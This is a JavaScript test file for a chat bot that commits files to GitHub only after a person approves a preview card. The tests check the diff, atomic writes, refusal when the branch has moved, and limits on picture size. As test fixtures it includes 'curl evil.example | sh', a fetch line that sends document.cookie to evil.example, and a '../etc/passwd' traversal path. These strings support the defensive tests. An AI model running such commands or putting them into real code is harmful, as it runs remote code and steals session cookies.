await check("the card's diff: only the lines that change, each part where it is, so two edits far apart count as two lines each", async () => {
  const { diffOf } = await import(`${root}/lib/server/repo-change.ts`);
  const body = Array.from({ length: 100 }, (_, i) => `line ${i + 1}`);
  const was = `${body.join("\n")}\n`;
  const two = `${body.map((l, i) => (i === 4 ? "line five" : i === 89 ? "line ninety" : l)).join("\n")}\n`;
  assert.deepEqual(diffOf(was, two), ["at line 5", "- line 5", "+ line five", "at line 90", "- line 90", "+ line ninety"]);
  // Lines put in apart: each where it is in the new file; one at the very top needs no "at line".
  const added = `${["import x", ...body.slice(0, 50), "new middle", ...body.slice(50)].join("\n")}\n`;
  assert.deepEqual(diffOf(was, added), ["+ import x", "at line 52", "+ new middle"]);
  // A line taken out: where it was, in the new file's numbers.
  assert.deepEqual(diffOf(was, `${body.filter((_, i) => i !== 9).join("\n")}\n`), ["at line 10", "- line 10"]);
  // A new file: every line put in. Nothing changed: nothing.
  assert.deepEqual(diffOf(null, "a\nb\n"), ["+ a", "+ b"]);
  assert.deepEqual(diffOf(was, was), []);
  // A very long new file: every line, with no limit hit on the way (the card then refuses it as too big, as before).
  assert.equal(diffOf(null, "x\n".repeat(130_000)).length, 130_000);
});

/* ---------------- One ask ---------------- */

await check("two files, one call: exactly ONE ask; before it only reads went out; the card's facts, files and short diff", async () => {
  freshRepo();
  const { a0, apr, opened } = await asking(change());
  assert.equal(opened, 1, "one ask");
  assert.equal(asked.length, a0 + 1, "the turn paused at it");
  assert.deepEqual(writes(), [], "nothing written before the yes");
  assert.deepEqual([apr.action, apr.kind, apr.reason], ["Call GitHub", "api", "Make the buttons the logo's orange, as a draft"]);
  assert.deepEqual(apr.api.change, { repo: "acme/site", branch: "main", at: gh.refs.get("main"), files: [{ path: "src/look.ts", op: "change", bytes: Buffer.byteLength(NEW_LOOK) }, { path: "src/notes.md", op: "add", bytes: 17 }] });
  assert.equal(apiFacts(apr.api), "GitHub · changes 2 files in acme/site, on main");
  assert.match(apr.preview, /^acme\/site, branch main\n\n/, "the repository and the branch first, in words an app that reads no more than them shows too");
  assert.match(apr.preview, /src\/look\.ts: changed, \d+ B\nat line 2\n- {3}accent: "#FFD400",\n\+ {3}accent: "#F15B3B",/);
  assert.match(apr.preview, /src\/notes\.md: added, 17 B\n\+ Buttons: orange\./);
  assert.ok(!/[A-Za-z0-9+/]{40,}={0,2}/.test(apr.preview), "no base64 on the card");
  globalThis.__lastAsk = apr;
});

await check("Allow: the blobs as UTF-8, the tree, the commit, and the branch moved last; the chat says it plainly; the bot gets the link", async () => {
  const apr = globalThis.__lastAsk;
  const was = gh.refs.get("main");
  const a0 = asked.length;
  assert.equal(P.replyToAsk(apr.id, "once"), undefined);
  await until(() => asked.length === a0 + 1 && gh.refs.get("main") !== was, "the change to go in");
  const w = writes();
  assert.deepEqual(w.map((c) => `${c.method} ${c.path}`), ["POST /repos/acme/site/git/blobs", "POST /repos/acme/site/git/blobs", "POST /repos/acme/site/git/trees", "POST /repos/acme/site/git/commits", "PATCH /repos/acme/site/git/refs/heads/main"], "the branch moves last");
  assert.deepEqual(w.slice(0, 2).map((c) => c.body), [{ content: NEW_LOOK, encoding: "utf-8" }, { content: "Buttons: orange.\n", encoding: "utf-8" }]);
  assert.equal(fileAt("main", "src/look.ts"), NEW_LOOK);
  assert.equal(fileAt("main", "README.md"), "# Site\n", "the rest kept");
  const out = outputOf(asked[a0]);
  assert.match(out, /^Saved: 2 files on main in acme\/site \(commit [0-9a-f]{7}\): https:\/\/github\.com\/acme\/site\/commit\/[0-9a-f]{40}$/);
  const notes = messages().filter((m) => m.appResult && m.at >= apr.at);
  assert.deepEqual(notes.map((m) => m.text), ["Boppy: Called GitHub PUT /repos/acme/site/contents/src/look.ts", "Boppy: Called GitHub PUT /repos/acme/site/contents/src/notes.md"], "one note per file, which the chat folds into one line");
  assert.ok(!S.getState().appApprovals.some((x) => x.id === apr.id), "the ask taken out");
});

await check("an existing branch moves by a fast forward, last; a delete says so on the card and in the facts line", async () => {
  const before = gh.refs.get("main");
  gh.calls = [];
  const { apr, opened } = await asking(change({ files: [{ path: "src/look.ts", text: NEW_LOOK.replace("F15B3B", "E04A2A"), delete: null }, { path: "old.css", text: null, delete: true }] }));
  assert.equal(opened, 1);
  assert.equal(apiFacts(apr.api), "GitHub · changes 1 file and deletes 1 in acme/site, on main");
  assert.match(apr.preview, /old\.css: deleted/);
  assert.ok(!/New branch/.test(apr.preview));
  assert.match(apr.preview, /^acme\/site, branch main\n\n/, "an existing branch named too");
  const a0 = asked.length;
  P.replyToAsk(apr.id, "once");
  await until(() => asked.length === a0 + 1, "the change to go in");
  assert.deepEqual(writes().map((c) => c.method).at(-1), "PATCH");
  assert.deepEqual(writes().at(-1).body.force, false);
  assert.equal(gh.commits.get(gh.refs.get("main")).parents[0], before);
  assert.equal(fileAt("main", "old.css"), undefined, "deleted");
  const only = await asking(change({ files: [{ path: "README.md", text: null, delete: true }] }));
  assert.equal(apiFacts(only.apr.api), "GitHub · deletes 1 file in acme/site, on main");
  P.replyToAsk(only.apr.id, "reject");
  await until(() => !S.getState().appApprovals.some((x) => x.id === only.apr.id), "the no to be read");
});

await check("Deny: nothing is written, and the bot is told", async () => {
  freshRepo();
  const was = gh.refs.get("main");
  const { apr } = await asking(change(), "Ok, I left it.");
  const a0 = asked.length;
  P.replyToAsk(apr.id, "reject", "Not yet");
  await until(() => asked.length === a0 + 1, "the turn to go on from the no");
  assert.equal(outputOf(asked[a0]), "Declined: Not yet");
  assert.deepEqual(writes(), []);
  assert.equal(gh.refs.get("main"), was);
});

await check("a failure part way leaves no half change on the branch: it never moves, and the bot hears why in plain words", async () => {
  freshRepo();
  const { apr } = await asking(change({ branch: "main" }));
  gh.fail = { method: "POST", path: /\/git\/commits$/, status: 422, message: "Validation Failed" };
  const was = gh.refs.get("main");
  const a0 = asked.length;
  P.replyToAsk(apr.id, "once");
  await until(() => asked.length === a0 + 1, "the turn to go on");
  gh.fail = null;
  assert.equal(gh.refs.get("main"), was, "main where it was");
  assert.ok(!writes().some((c) => /\/git\/refs/.test(c.path)), "the branch never moved");
  assert.equal(outputOf(asked[a0]), "Not saved: making the commit, GitHub answered 422 (Validation Failed). Nothing changed on main.");
  assert.match(messages().findLast((m) => m.appResult).text, /^Boppy couldn't call it: making the commit, GitHub answered 422/);
});

/** Someone else's commit on `ref` (a teammate saving meanwhile): `path` says `text` there. */
function theirCommit(ref, path, text) {
  const was = gh.refs.get(ref);
  const tree = { ...gh.trees.get(gh.commits.get(was).tree), [path]: { sha: gh.blob(Buffer.from(text)), mode: "100644" } };
  const treeSha = sha1(JSON.stringify(tree));
  gh.trees.set(treeSha, tree);
  const sha = sha1(`theirs${treeSha}${was}`);
  gh.commits.set(sha, { tree: treeSha, parents: [was], message: "A teammate's change" });
  gh.refs.set(ref, sha);
  return sha;
}

await check("the yes is to the card: a branch that moved after it was made stops the change, writing nothing, so a teammate's work is never undone", async () => {
  freshRepo();
  const { apr } = await asking(change({ branch: "main" }));
  assert.equal(apr.api.change.at, gh.refs.get("main"), "the card says the commit it was made from");
  const theirs = theirCommit("main", "src/look.ts", "export const look = { accent: \"#00AA00\" };\n");
  gh.calls = [];
  const a0 = asked.length;
  P.replyToAsk(apr.id, "once");
  await until(() => asked.length === a0 + 1, "the turn to go on");
  assert.deepEqual(writes(), [], "nothing written");
  assert.equal(gh.refs.get("main"), theirs, "the teammate's commit stays");
  assert.equal(outputOf(asked[a0]), "Not saved: main changed after the card was made, and this could undo that. Ask again to see what changes now. Nothing changed on main.");
  // A new branch someone made meanwhile: the same (a change to .github/ asks on any branch).
  const fresh = await asking(change({ branch: "site/new", files: [{ path: ".github/workflows/ci.yml", text: "on: push\n", delete: null }] }));
  gh.refs.set("site/new", gh.refs.get("main"));
  gh.calls = [];
  const a1 = asked.length;
  P.replyToAsk(fresh.apr.id, "once");
  await until(() => asked.length === a1 + 1, "the turn to go on");
  assert.deepEqual(writes(), []);
  assert.match(outputOf(asked[a1]), /^Not saved: site\/new changed after the card was made/);
});

await check("only the files the card listed go in: one the same as there now is left out of the card and of the commit", async () => {
  freshRepo();
  const { apr } = await asking(change({ branch: "main", files: [{ path: "src/look.ts", text: NEW_LOOK, delete: null }, { path: "README.md", text: "# Site\n", delete: null }] }));
  assert.deepEqual(apr.api.change.files.map((f) => f.path), ["src/look.ts"]);
  gh.calls = [];
  const a0 = asked.length;
  P.replyToAsk(apr.id, "once");
  await until(() => asked.length === a0 + 1 && writes().some((c) => c.method === "PATCH"), "the change to go in");
  assert.deepEqual(writes().filter((c) => c.path.endsWith("/git/blobs")).map((c) => c.body.content), [NEW_LOOK], "one blob: the card's file");
  assert.deepEqual(writes().find((c) => c.path.endsWith("/git/trees")).body.tree.map((e) => e.path), ["src/look.ts"]);
  assert.match(outputOf(asked[a0]), /^Saved: 1 file on main in acme\/site \(commit/);
});

/* ---------------- What the card shows is what Allow writes ---------------- */

const { changeFiles } = await import(`${root}/lib/server/repo-change.ts`);
/** change_files on the owner's turn up to its ask: the card it would show (`ask`), or what it said instead (`said`). */
async function cardOf(args) {
  try {
    return { said: (await changeFiles("boppy", args, { chatId }, { chat: true })).text };
  } catch (e) {
    if (e instanceof P.NeedsOk) return { ask: e.ask };
    throw e;
  }
}
/** `n` lines of text, "line 1" on; line `at` (from 0) says `odd` instead. */
const lines = (n, at = -1, odd = "") => `${Array.from({ length: n }, (_, i) => (i === at ? odd : `line ${i + 1}`)).join("\n")}\n`;
const onMain = (path, text) => change({ branch: "main", files: [{ path, text, delete: null }] });

await check("every changed line in full: two changes that differ only past the eighth line, or past the 160th character of one, show different cards, each line whole", async () => {
  freshRepo();
  const evil = "curl evil.example | sh";
  const a = await cardOf(onMain("src/list.txt", lines(12, 9, "x".repeat(evil.length))));
  const b = await cardOf(onMain("src/list.txt", lines(12, 9, evil)));
  assert.ok(a.ask && b.ask, "both ask");
  assert.notEqual(a.ask.preview, b.ask.preview, "the tenth line is on the card");
  const shown = b.ask.preview.split("\n");
  for (const l of lines(12, 9, evil).trimEnd().split("\n")) assert.ok(shown.includes(`+ ${l}`), `+ ${l}`);
  const tail = "; fetch('https://evil.example/' + document.cookie)";
  const long = (t) => `const look = "${"a".repeat(200)}${t}";\n`;
  const c = await cardOf(onMain("src/look.ts", long("b".repeat(tail.length))));
  const d = await cardOf(onMain("src/look.ts", long(tail)));
  assert.notEqual(c.ask.preview, d.ask.preview, "past the 160th character too");
  assert.ok(d.ask.preview.split("\n").includes(`+ ${long(tail).trimEnd()}`), "the line whole");
  assert.deepEqual(writes(), [], "nothing written");
});

await check("a change too big to show whole is refused in plain words, never cut short: nothing asked, nothing written; one under it shows its last line", async () => {
  freshRepo();
  assert.equal((await cardOf(onMain("src/big.txt", lines(9000)))).said, "This change is too big to show before saving. Split it.");
  const fits = await cardOf(onMain("src/big.txt", lines(4000)));
  assert.ok(fits.ask?.preview.endsWith("\n+ line 4000"), "whole, to its last line");
  assert.deepEqual(writes(), []);
});

await check("an existing file too big to read is refused, never asked for blind", async () => {
  freshRepo();
  theirCommit("main", "data/big.csv", "x,y\n".repeat(300_000));
  const r = await cardOf(onMain("data/big.csv", "x,y\n"));
  assert.equal(r.said ?? `asked: ${r.ask.preview.slice(0, 200)}`, "data/big.csv is too big to show what changes before saving, so it can't be changed here.");
  assert.deepEqual(writes(), []);
});

await check("an executable stays one: its mode read before the ask from the card's commit, kept on the card, and written by the yes; a new file is 100644", async () => {
  freshRepo();
  const { apr } = await asking(change({ branch: "main", files: [{ path: "run.sh", text: "#!/bin/sh\necho bye\n", delete: null }, { path: "tools/new.sh", text: "#!/bin/sh\n", delete: null }] }));
  assert.deepEqual(apr.api.change.files.map((f) => [f.path, f.mode]), [["run.sh", "100755"], ["tools/new.sh", undefined]], "the card keeps what was read");
  assert.ok(gh.calls.every((c) => c.method === "GET"), "before the ask, reads only");
  assert.ok(gh.calls.filter((c) => c.path.includes("/git/trees/")).length <= 2, "a folder's list read once");
  gh.calls = [];
  const a0 = asked.length;
  P.replyToAsk(apr.id, "once");
  await until(() => asked.length === a0 + 1 && writes().some((c) => c.method === "PATCH"), "the change to go in");
  assert.deepEqual(writes().find((c) => c.path.endsWith("/git/trees")).body.tree.map((e) => [e.path, e.mode]), [["run.sh", "100755"], ["tools/new.sh", "100644"]]);
  assert.deepEqual([entryOf("main", "run.sh").mode, fileAt("main", "run.sh")], ["100755", "#!/bin/sh\necho bye\n"]);
  assert.equal(entryOf("main", "tools/new.sh").mode, "100644");
});

await check("a link, or a repository of its own inside, is never changed or deleted: refused in plain words before any ask, nothing written", async () => {
  freshRepo();
  const cases = [
    ["docs/latest", "docs/latest isn't a file in acme/site: it's a link to another file or folder."],
    ["lib/vendor", "lib/vendor isn't a file in acme/site: it's a repository of its own inside this one."],
    ["docs/latest/x.md", "docs/latest isn't a folder in acme/site: it's a link to another file or folder."],
  ];
  for (const [path, said] of cases) {
    const edit = await cardOf(onMain(path, "changed\n"));
    assert.equal(edit.said ?? `asked: ${edit.ask.preview}`, said, path);
    const gone = await cardOf(change({ branch: "main", files: [{ path, text: null, delete: true }] }));
    assert.equal(gone.said ?? `asked: ${gone.ask.preview}`, said, `delete ${path}`);
  }
  assert.deepEqual(writes(), []);
});

await check("the same text as there now asks nothing; bad input is said plainly and sends nothing", async () => {
  freshRepo();
  const { changeFiles } = await import(`${root}/lib/server/repo-change.ts`);
  const same = await changeFiles("boppy", change({ branch: "main", files: [{ path: "README.md", text: "# Site\n", delete: null }] }), { chatId }, { chat: true });
  assert.equal(same.text, "Nothing to change: the file already says that on main.");
  assert.deepEqual(writes(), []);
  gh.calls = [];
  const say = async (over) => (await changeFiles("boppy", change(over), { chatId }, { chat: true })).text;
  assert.match(await say({ repo: "acme" }), /owner\/name/);
  assert.match(await say({ branch: "a..b" }), /isn't a branch name/);
  assert.match(await say({ files: [{ path: "../etc/passwd", text: "x", delete: null }] }), /isn't a path in the repository/);
  assert.match(await say({ files: [{ path: "/abs.txt", text: "x", delete: null }] }), /isn't a path in the repository/);
  assert.match(await say({ files: [{ path: "a.txt", text: "x", delete: true }] }), /one of its text, delete true, image or imageUrl, not more/);
  assert.match(await say({ files: [{ path: "a.txt", text: null, delete: null }] }), /whole new text/);
  assert.match(await say({ files: [{ path: "a.txt", text: "x", delete: null }, { path: "a.txt", text: "y", delete: null }] }), /twice/);
  assert.match(await say({ files: Array.from({ length: 21 }, (_, i) => ({ path: `f${i}.txt`, text: "x", delete: null })) }), /At most 20 files/);
  assert.match(await say({ files: [{ path: "gone.txt", text: null, delete: true }] }), /There's no gone\.txt on main to delete\./);
  assert.ok(writes().length === 0, "nothing written for any of it");
});

await check("a member's turn always asks, named as theirs, even with an Always allow saved", async () => {
  freshRepo();
  S.update(() => (S.bot("boppy").permissions = [{ action: "Call GitHub", resource: "*", effect: "allow" }]));
  try {
    const { changeFiles } = await import(`${root}/lib/server/repo-change.ts`);
    const e = await changeFiles("boppy", change(), { chatId, member: "Dee" }, { chat: true }).then(() => null, (x) => x);
    assert.ok(e instanceof P.NeedsOk);
    assert.equal(e.ask.askedFor, "Dee");
    assert.deepEqual(writes(), []);
  } finally {
    S.update(() => delete S.bot("boppy").permissions);
  }
});

/* ---------------- Pictures from the chat ---------------- */

/** A picture file of a change: in place of text, one of the chat's (its number) or a link. */
const picture = (path, over) => ({ path, text: null, delete: null, image: null, imageUrl: null, ...over });
/** The bytes of the blob the stand-in GitHub keeps at `path` on `ref`. */
/** The bytes of file `p` on branch `ref` (a tree's entry is its blob and its mode). */
const blobAt = (ref, p) => gh.blobs.get(gh.trees.get(gh.commits.get(gh.refs.get(ref))?.tree)?.[p]?.sha);

await check("a picture a person attached goes in byte for byte: its number is said to the bot, the card shows its copy, and the blob is the attachment's exact bytes as base64 only Bops makes", async () => {
  freshRepo();
  const logo = PNG(900);
  const up = Up.saveUpload(`data:image/png;base64,${logo.toString("base64")}`);
  S.addMessage({ chatId, role: "user", text: "Here's our logo, use it as the favicon", images: [{ id: up.id, type: up.type }], at: Date.now() });
  const { a0, apr, opened } = await asking(change({ branch: "site/favicon", message: "Use the logo as the favicon", reason: "Use our logo as the site's little tab icon", files: [picture("public/favicon.png", { image: 1 })] }));
  assert.equal(opened, 1);
  // The bot was told the picture's number, where it saw it.
  assert.match(JSON.stringify(asked[a0].input), /Here's our logo, use it as the favicon \[Bops: picture 1\]/);
  assert.deepEqual(apr.api.change.files, [{ path: "public/favicon.png", op: "add", bytes: logo.length, image: { id: up.id } }]);
  assert.match(apr.preview, /public\/favicon\.png: added, 908 B, picture 1 from the chat/);
  assert.equal(apiFacts(apr.api), "GitHub · changes 1 file in acme/site, on site/favicon");
  assert.deepEqual(writes(), []);
  const n = asked.length;
  P.replyToAsk(apr.id, "once");
  await until(() => asked.length === n + 1 && gh.refs.has("site/favicon"), "the change to go in");
  const blob = writes().find((c) => c.path.endsWith("/git/blobs"));
  assert.equal(blob.body.encoding, "base64");
  assert.equal(sha256(Buffer.from(blob.body.content, "base64")), sha256(logo), "the attachment's exact bytes");
  assert.equal(sha256(blobAt("site/favicon", "public/favicon.png")), sha256(logo));
});

await check("a picture far bigger than the card's words goes on it as one line, its thumbnail, name, size and pixel size, never a diff: it counts toward the card's cap by its words, not its bytes", async () => {
  freshRepo();
  const logo = PNG_OF(512, 384, 200 * 1024);
  const up = Up.saveUpload(`data:image/png;base64,${logo.toString("base64")}`);
  const said = S.addMessage({ chatId, role: "user", text: "Here's the big logo", images: [{ id: up.id, type: up.type }], at: Date.now() });
  const n = (await import(`${root}/lib/server/chat-pictures.ts`)).chatPictures(chatId).length;
  const { apr } = await asking(change({ branch: "site/big-logo", message: "Use the big logo", reason: "Use the big logo", files: [picture("public/logo.png", { image: n })] }));
  assert.ok(apr, "asked, not refused as too big to show");
  assert.deepEqual(apr.api.change.files, [{ path: "public/logo.png", op: "add", bytes: logo.length, image: { id: up.id, w: 512, h: 384 } }]);
  assert.match(apr.preview, new RegExp(`public/logo\\.png: added, 200\\.0 KB, 512 × 384, picture ${n} from the chat`));
  assert.ok(Buffer.byteLength(apr.preview) < 1024, "words only, never the bytes");
  const n0 = asked.length;
  P.replyToAsk(apr.id, "reject");
  await until(() => asked.length === n0 + 1, "the turn to go on from the no");
  // (Gone again, so the chat has the one picture the next checks count.)
  S.update((s) => void (s.messages = s.messages.filter((m) => m.id !== said.id)));
});

await check("a picture is 700 KB at most, as its blob goes through Orgo's broker (1 MB a request): a bigger one is refused before anything is read, never after the yes", async () => {
  freshRepo();
  const { changeFiles } = await import(`${root}/lib/server/repo-change.ts`);
  const big = PNG_OF(64, 64, 800 * 1024 - 33);
  const up = Up.saveUpload(`data:image/png;base64,${big.toString("base64")}`);
  const said = S.addMessage({ chatId, role: "user", text: "The big one", images: [{ id: up.id, type: up.type }], at: Date.now() });
  try {
    const n = (await import(`${root}/lib/server/chat-pictures.ts`)).chatPictures(chatId).length;
    const r = await changeFiles("boppy", change({ files: [picture("public/big.png", { image: n })] }), { chatId }, { chat: true });
    assert.equal(r.text, "public/big.png: this picture is 800.0 KB, and Bops can put in pictures up to 700 KB for now. A smaller copy of it would go.");
    assert.deepEqual(gh.calls, [], "not even a read");
  } finally {
    S.update((s) => void (s.messages = s.messages.filter((m) => m.id !== said.id)));
  }
});

await check("one at 700 KB goes in on the yes, its request under the broker's 1 MB; a request the broker refuses says why in one sentence, writing nothing", async () => {
  freshRepo();
  const { changeFiles } = await import(`${root}/lib/server/repo-change.ts`);
  const most = PNG_OF(640, 480, 700 * 1024 - 33);
  const up = Up.saveUpload(`data:image/png;base64,${most.toString("base64")}`);
  const said = S.addMessage({ chatId, role: "user", text: "The hero", images: [{ id: up.id, type: up.type }], at: Date.now() });
  try {
    const n = (await import(`${root}/lib/server/chat-pictures.ts`)).chatPictures(chatId).length;
    const args = change({ branch: "site/hero", files: [picture("public/hero.png", { image: n })] });
    const e = await changeFiles("boppy", args, { chatId }, { chat: true }).then((r) => r, (x) => x);
    assert.ok(e instanceof P.NeedsOk, e?.text);
    const refused = broker.refused;
    const done = await changeFiles("boppy", args, { chatId }, { chat: true, approved: true, asked: e.ask.api.change });
    assert.equal(done.failed, undefined, done.text);
    assert.equal(broker.refused, refused, "the broker took every request");
    assert.equal(sha256(blobAt("site/hero", "public/hero.png")), sha256(most));
    // A broker that takes less (its words end in a full stop): one sentence, never "..".
    freshRepo();
    const e2 = await changeFiles("boppy", args, { chatId }, { chat: true }).then((r) => r, (x) => x);
    broker.maxRequest = 100 * 1024;
    const no = await changeFiles("boppy", args, { chatId }, { chat: true, approved: true, asked: e2.ask.api.change });
    assert.equal(no.text, "Not saved: Orgo didn't send it: Request body is too large. Nothing changed on site/hero.");
    assert.equal(no.failed?.why, "Orgo didn't send it: Request body is too large");
    assert.equal(gh.refs.has("site/hero"), false, "nothing written");
  } finally {
    broker.maxRequest = 1024 * 1024;
    S.update((s) => void (s.messages = s.messages.filter((m) => m.id !== said.id)));
  }
});

await check("a change with pictures is 12 MB at most in all, its text counted too: refused before anything is read", async () => {
  freshRepo();
  const { changeFiles } = await import(`${root}/lib/server/repo-change.ts`);
  const most = PNG_OF(64, 64, 700 * 1024 - 33);
  const up = Up.saveUpload(`data:image/png;base64,${most.toString("base64")}`);
  const said = S.addMessage({ chatId, role: "user", text: "The tiles", images: [{ id: up.id, type: up.type }], at: Date.now() });
  try {
    const n = (await import(`${root}/lib/server/chat-pictures.ts`)).chatPictures(chatId).length;
    // 17 at 700 KB is 11.6 MB: with 400 KB of text it's past 12 MB.
    const tiles = Array.from({ length: 17 }, (_, i) => picture(`public/tile-${i}.png`, { image: n }));
    const r = await changeFiles("boppy", change({ files: [...tiles, { path: "notes.txt", text: "x".repeat(400 * 1024), delete: null }] }), { chatId }, { chat: true });
    assert.equal(r.text, "The change is too big with its pictures (12 MB at most in all).");
    assert.deepEqual(gh.calls, [], "not even a read");
    const without = await changeFiles("boppy", change({ files: tiles }), { chatId }, { chat: true }).then((x) => x, (x) => x);
    assert.ok(without instanceof P.NeedsOk, "under it without the text");
  } finally {
    S.update((s) => void (s.messages = s.messages.filter((m) => m.id !== said.id)));
  }
});

await check("a picture there now past what the broker answers whole (450 KB) is replaced without reading it back: the card says changed; the same picture asks nothing", async () => {
  freshRepo();
  const { changeFiles } = await import(`${root}/lib/server/repo-change.ts`);
  const old = PNG(450 * 1024);
  theirCommit("main", "public/hero.jpg", old);
  const next = PNG_OF(1200, 600, 300 * 1024);
  const a = Up.saveUpload(`data:image/png;base64,${next.toString("base64")}`);
  const b = Up.saveUpload(`data:image/png;base64,${old.toString("base64")}`);
  const said = S.addMessage({ chatId, role: "user", text: "New hero, and the old one", images: [{ id: a.id, type: a.type }, { id: b.id, type: b.type }], at: Date.now() });
  try {
    const all = (await import(`${root}/lib/server/chat-pictures.ts`)).chatPictures(chatId).length;
    const e = await changeFiles("boppy", change({ branch: "site/hero", files: [picture("public/hero.jpg", { image: all - 1 })] }), { chatId }, { chat: true }).then((r) => r, (x) => x);
    assert.ok(e instanceof P.NeedsOk, e?.text);
    assert.deepEqual(e.ask.api.change.files.map((f) => [f.path, f.op, f.bytes]), [["public/hero.jpg", "change", next.length]]);
    assert.match(e.ask.preview, /public\/hero\.jpg: changed, 300\.0 KB, 1200 × 600/);
    assert.ok(!gh.calls.some((c) => c.path.includes("/contents/public/hero.jpg")), "never read back");
    const done = await changeFiles("boppy", change({ branch: "site/hero", files: [picture("public/hero.jpg", { image: all - 1 })] }), { chatId }, { chat: true, approved: true, asked: e.ask.api.change });
    assert.equal(done.failed, undefined, done.text);
    assert.equal(sha256(blobAt("site/hero", "public/hero.jpg")), sha256(next));
    const same = await changeFiles("boppy", change({ files: [picture("public/hero.jpg", { image: all })] }), { chatId }, { chat: true });
    assert.equal(same.text, "Nothing to change: the file already says that on main.");
  } finally {
    S.update((s) => void (s.messages = s.messages.filter((m) => m.id !== said.id)));
  }
});

await check("a picture number that doesn't exist is said plainly, and nothing goes out", async () => {
  freshRepo();
  const { changeFiles } = await import(`${root}/lib/server/repo-change.ts`);
  const r = await changeFiles("boppy", change({ files: [picture("public/favicon.png", { image: 2 })] }), { chatId }, { chat: true });
  assert.equal(r.text, "There's no picture 2 in this chat: people here attached one.");
  assert.deepEqual(gh.calls, [], "not even a read");
  const other = await changeFiles("boppy", change({ files: [picture("public/favicon.png", { image: 1 })] }), { chatId: botChatId("max") }, { chat: true });
  assert.equal(other.text, "There's no picture 1 in this chat: nobody has attached one here.", "another chat's pictures aren't this one's");
});

await check("a picture link a person pasted: the bot is shown the picture, and it goes in with the bytes the card showed, even when the link changes after", async () => {
  freshRepo();
  const url = `${SITE}/logo.png`;
  const first = site.get("/logo.png").bytes;
  answers.push(reply("I see an orange logo."));
  const n = asked.length;
  await Chat.handleMessage(chatId, `Can you see this? ${url}`);
  const shown = JSON.stringify(asked[n].input);
  assert.ok(shown.includes(`data:image/png;base64,${first.toString("base64")}`), "the picture, for the model to look at");
  assert.match(shown, /\[Bops: the picture at that link is shown here\]/);
  const { apr } = await asking(change({ branch: "site/logo", files: [picture("public/logo.png", { imageUrl: url })] }));
  const [f] = apr.api.change.files;
  assert.deepEqual([f.path, f.op, f.bytes, f.image?.url], ["public/logo.png", "add", first.length, url]);
  assert.match(f.image.id, /^img_/, "a copy here, for the thumbnail and the yes");
  assert.match(apr.preview, new RegExp(`public/logo\\.png: added, [\\d.]+ B, the picture at ${url.replace(/[.]/g, "\\.")}`));
  // The link changes before the yes: what goes in is what the card showed.
  site.set("/logo.png", { type: "image/png", bytes: PNG(50) });
  globalThis.bopsLinkedPictures.clear();
  const k = asked.length;
  P.replyToAsk(apr.id, "once");
  await until(() => asked.length === k + 1 && gh.refs.has("site/logo"), "the change to go in");
  assert.equal(sha256(blobAt("site/logo", "public/logo.png")), sha256(first), "the fetched bytes the card showed");
});

await check("the yes commits only the card's copy: one gone by then stops the change, writing nothing, never fetched again; on the bot's computer a picture change is refused in plain words", async () => {
  freshRepo();
  const url = `${SITE}/logo.png`;
  site.set("/logo.png", { type: "image/png", bytes: PNG(120) });
  globalThis.bopsLinkedPictures.clear();
  S.addMessage({ chatId, role: "user", text: `Use this one: ${url}`, at: Date.now() });
  const { apr } = await asking(change({ branch: "site/gone", files: [picture("public/logo.png", { imageUrl: url })] }));
  const copy = Up.uploadPath(apr.api.change.files[0].image.id);
  assert.ok(copy, "a copy kept for the card");
  rmSync(copy.path);
  site.set("/logo.png", { type: "image/png", bytes: PNG(30) });
  globalThis.bopsLinkedPictures.clear();
  const hits = siteHits.length;
  gh.calls = [];
  const a0 = asked.length;
  P.replyToAsk(apr.id, "once");
  await until(() => asked.length === a0 + 1, "the turn to go on");
  assert.deepEqual(writes(), [], "nothing written");
  assert.equal(siteHits.length, hits, "the link never fetched again");
  assert.equal(outputOf(asked[a0]), "Not saved: the picture the card showed for public/logo.png isn't here any more. Ask again. Nothing changed on site/gone.");
  // A chat answered from the bot's computer: it keeps neither the chat's pictures nor the card's copies.
  const { changeFiles } = await import(`${root}/lib/server/repo-change.ts`);
  process.env.BOPS_RUNNER = "1";
  try {
    const r = await changeFiles("boppy", change({ files: [picture("public/logo.png", { imageUrl: url })] }), { chatId }, { chat: true });
    assert.equal(r.text, "A picture can't go into a change from here yet. Only text files can.");
  } finally {
    delete process.env.BOPS_RUNNER;
  }
  assert.equal(siteHits.length, hits, "nor fetched there");
});

await check("on the bot's computer the chat's change_files says nothing of pictures, and the chat doesn't number them: never a word of the Mac", async () => {
  const { changeFilesTool } = await import(`${root}/lib/server/repo-change.ts`);
  const logo = PNG(300);
  const up = Up.saveUpload(`data:image/png;base64,${logo.toString("base64")}`);
  const said = S.addMessage({ chatId, role: "user", text: "Our logo for the runner", images: [{ id: up.id, type: up.type }], at: Date.now() });
  process.env.BOPS_RUNNER = "1";
  try {
    const tool = changeFilesTool([Keys.keyProvider("GITHUB_TOKEN")], { pictures: true });
    assert.deepEqual(Object.keys(tool.parameters.properties.files.items.properties), ["path", "text", "delete"]);
    assert.deepEqual(tool.parameters.properties.files.items.required, ["path", "text", "delete"]);
    assert.doesNotMatch(JSON.stringify(tool), /picture|image|\bMac\b/i);
  } finally {
    delete process.env.BOPS_RUNNER;
  }
  // The turn (a runner's can't run here: it signs in with its computer's own key) offers pictures and numbers them only off a runner.
  const src = readFileSync(`${root}/lib/server/chat.ts`, "utf8");
  assert.match(src, /const changePictures = !onRunner\(\);\s+const changeTool = changeFilesTool\(keyed, \{ pictures: changePictures \}\);/);
  assert.match(src, /history\(chatId, botId, \{[^}]*pictures: !!changeTool && changePictures/);
  // On the Mac the same chat numbers it.
  answers.push(reply("Got it."));
  const n = asked.length;
  await Chat.handleMessage(chatId, "thanks");
  assert.match(JSON.stringify(asked[n].input), /Our logo for the runner \[Bops: picture \d+\]/);
  S.update((s) => void (s.messages = s.messages.filter((m) => m.id !== said.id)));
});

/** The card copies of linked pictures kept on this Mac (uploads.ts keepCopy): their ids. */
const copies = () => readdirSync(Up.uploadsDir()).filter((f) => /^img_c[0-9a-f]{32}\./.test(f)).map((f) => f.replace(/\.[a-z]+$/, ""));

await check("a linked picture's copy is made only when a card shows, one per picture: none for a draft, the same one asked again, gone on a no and once the yes is done; one no card names goes after an hour", async () => {
  const { changeFiles } = await import(`${root}/lib/server/repo-change.ts`);
  const url = `${SITE}/mark.png`;
  const mark = PNG(2000);
  site.set("/mark.png", { type: "image/png", bytes: mark });
  globalThis.bopsLinkedPictures.clear();
  S.addMessage({ chatId, role: "user", text: `Our mark: ${url}`, at: Date.now() });
  for (const id of copies()) rmSync(Up.uploadPath(id).path);
  // A draft goes at once: no card, no copy.
  freshRepo();
  listDrafts();
